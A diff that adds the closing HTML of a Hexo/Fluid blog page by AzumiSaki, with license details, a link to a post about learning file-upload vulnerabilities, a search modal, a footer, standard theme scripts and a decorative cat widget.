+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>AzumiSaki</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/08/upload/" title="记一次文件上传漏洞的学习及又一次提权练习">
+                        <span class="hidden-mobile">记一次文件上传漏洞的学习及又一次提权练习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/navbar-hide.js"></script><script src="/js/runtime.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <div id="corner-cat" aria-hidden="true">
+    <div class="cat-svg-wrap">
+      <svg class="cat-svg" viewBox="0 0 140 90" xmlns="http://www.w3.org/2000/svg">
+        <g class="cat-tail">
+          <path d="M112 54 C128 42, 132 30, 122 18 C136 24, 138 42, 126 56"
+                fill="none" stroke="currentColor" stroke-width="6" stroke-linecap="round"/>
+        </g>
+
+        <g class="cat-body-main">
+          <ellipse cx="72" cy="52" rx="34" ry="22" fill="currentColor" opacity="0.16"/>
+          <ellipse cx="70" cy="48" rx="30" ry="20" fill="currentColor"/>
+          <circle cx="42" cy="42" r="16" fill="currentColor"/>
+
+          <path d="M31 31 L36 18 L43 31 Z" fill="currentColor"/>
+          <path d="M41 31 L48 18 L52 32 Z" fill="currentColor"/>
+
+          <path d="M35 42 h4" class="cat-eye left-eye"/>
+          <path d="M45 42 h4" class="cat-eye right-eye"/>
+
+          <circle cx="41.5" cy="46.5" r="1.2" fill="#f6c2d8"/>
+          <path d="M39 49 Q41.5 51 44 49" class="cat-mouth"/>
+
+          <path d="M28 46 h-10" class="cat-whisker"/>
+          <path d="M28 49 h-9" class="cat-whisker"/>
+          <path d="M55 46 h10" class="cat-whisker"/>
+          <path d="M55 49 h9" class="cat-whisker"/>
+
+          <g class="cat-legs">
+            <path d="M56 63 v12" class="cat-leg"/>
+            <path d="M68 65 v12" class="cat-leg"/>
+            <path d="M82 65 v12" class="cat-leg"/>
+            <path d="M94 63 v12" class="cat-leg"/>
+          </g>
+        </g>
+      </svg>
+    </div>
+  </div>
+
+  <div class="anime-footer-wrap">
+    <div class="anime-footer">
+      <div class="footer-line"><span id="runtime"></span></div>
+      <div class="footer-line typing" id="footer-typing"></div>
+      <div class="footer-line small">
+        © 2026 AzumiSaki · Powered by Hexo & Fluid
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/footer.js"></script>
+  <script src="/js/falling.js"></script>
+  <script src="/js/corner-cat.js"></script>
+  
+  <div id="corner-cat" aria-hidden="true">
+    <div class="cat-body">(=^-ω-^=)</div>
+  </div>
+
+  <script src="/js/footer.js"></script>
+  <script src="/js/falling.js"></script>
+  <script src="/js/corner-cat.js"></script>
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <!-- hexo injector body_end end --></body>
+</html>
